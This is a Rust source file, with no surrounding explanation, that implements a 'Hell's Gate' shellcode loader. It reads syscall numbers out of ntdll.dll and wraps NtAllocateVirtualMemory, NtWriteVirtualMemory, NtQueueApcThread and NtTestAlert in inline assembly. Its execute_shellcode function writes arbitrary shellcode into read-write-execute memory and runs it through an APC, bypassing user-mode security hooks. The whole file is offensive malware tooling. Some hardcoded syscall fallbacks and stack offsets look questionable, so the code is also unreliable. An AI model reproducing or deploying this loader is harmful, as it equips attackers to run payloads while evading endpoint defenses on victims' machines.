use std::ptr::null_mut;
use std::ffi::CString;
use std::arch::asm;

type HANDLE = isize;
type NTSTATUS = i32;
type PVOID = *mut std::ffi::c_void;
#[allow(non_camel_case_types)]
type SIZE_T = usize;

const NT_CURRENT_PROCESS: HANDLE = -1isize as HANDLE;
const NT_CURRENT_THREAD: HANDLE = -2isize as HANDLE;

// Hell's Gate: Extract syscall number from ntdll.dll
unsafe fn get_ssn(function_name: &str) -> Option<u16> {
    let ntdll = CString::new("ntdll.dll").unwrap();
    let func = CString::new(function_name).unwrap();
    
    let hmod = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(ntdll.as_ptr() as *const u8);
    if hmod.is_null() {
        return None;
    }
    
    let func_addr = windows_sys::Win32::System::LibraryLoader::GetProcAddress(hmod, func.as_ptr() as *const u8);
    if func_addr.is_none() {
        return None;
    }
    
    let addr = func_addr.unwrap() as *const u8;
    
    // Parse stub: mov r10, rcx; mov eax, <SSN>; syscall
    // Pattern: 4C 8B D1 B8 [SSN] [SSN] 00 00
    if *addr.offset(0) == 0x4C && *addr.offset(1) == 0x8B && *addr.offset(2) == 0xD1 && *addr.offset(3) == 0xB8 {
        let ssn = *addr.offset(4) as u16 | ((*addr.offset(5) as u16) << 8);
        return Some(ssn);
    }
    
    None
}


unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    region_size: *mut SIZE_T,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS {
    let ssn = get_ssn("NtAllocateVirtualMemory").unwrap_or(0x18);
    
    let result: NTSTATUS;
    asm!(
        "sub rsp, 0x28",           // Shadow space + alignment
        "mov [rsp + 0x28], {alloc}",  // 5th arg on stack
        "mov [rsp + 0x30], {prot}",   // 6th arg on stack
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x28",
        ssn = in(reg) ssn as u32,
        alloc = in(reg) allocation_type as u64,
        prot = in(reg) protect as u64,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") zero_bits,
        in("r9") region_size,
        lateout("rax") result,
        out("r10") _,
        out("r11") _,
    );
    result
}

unsafe fn nt_write_virtual_memory(
    process_handle: HANDLE,
    base_address: PVOID,
    buffer: PVOID,
    buffer_size: SIZE_T,
    bytes_written: *mut SIZE_T,
) -> NTSTATUS {
    let ssn = get_ssn("NtWriteVirtualMemory").unwrap_or(0x3A);
    
    let result: NTSTATUS;
    asm!(
        "sub rsp, 0x28",
        "mov [rsp + 0x28], {bytes}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x28",
        ssn = in(reg) ssn as u32,
        bytes = in(reg) bytes_written,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") buffer,
        in("r9") buffer_size,
        lateout("rax") result,
        out("r10") _,
        out("r11") _,
    );
    result
}

unsafe fn nt_queue_apc_thread(
    thread_handle: HANDLE,
    apc_routine: PVOID,
    apc_arg1: PVOID,
    apc_arg2: PVOID,
    apc_arg3: PVOID,
) -> NTSTATUS {
    let ssn = get_ssn("NtQueueApcThread").unwrap_or(0x45);
    
    let result: NTSTATUS;
    asm!(
        "sub rsp, 0x28",
        "mov [rsp + 0x28], {arg3}",
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x28",
        ssn = in(reg) ssn as u32,
        arg3 = in(reg) apc_arg3,
        in("rcx") thread_handle,
        in("rdx") apc_routine,
        in("r8") apc_arg1,
        in("r9") apc_arg2,
        lateout("rax") result,
        out("r10") _,
        out("r11") _,
    );
    result
}

unsafe fn nt_test_alert() -> NTSTATUS {
    let ssn = get_ssn("NtTestAlert").unwrap_or(0x1F6);
    
    let result: NTSTATUS;
    asm!(
        "sub rsp, 0x28",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x28",
        ssn = in(reg) ssn as u32,
        lateout("rax") result,
        out("r10") _,
        out("r11") _,
    );
    result
}

pub fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let mut allocstart: PVOID = null_mut();
        let mut seize: SIZE_T = shellcode.len();
        
        nt_allocate_virtual_memory(NT_CURRENT_PROCESS, &mut allocstart, 0, &mut seize, 0x00003000, 0x40);
        nt_write_virtual_memory(NT_CURRENT_PROCESS, allocstart, shellcode.as_ptr() as _, shellcode.len(), null_mut());
        nt_queue_apc_thread(NT_CURRENT_THREAD, allocstart, allocstart, null_mut(), null_mut());
        nt_test_alert();
    }
    
    Ok(())
}

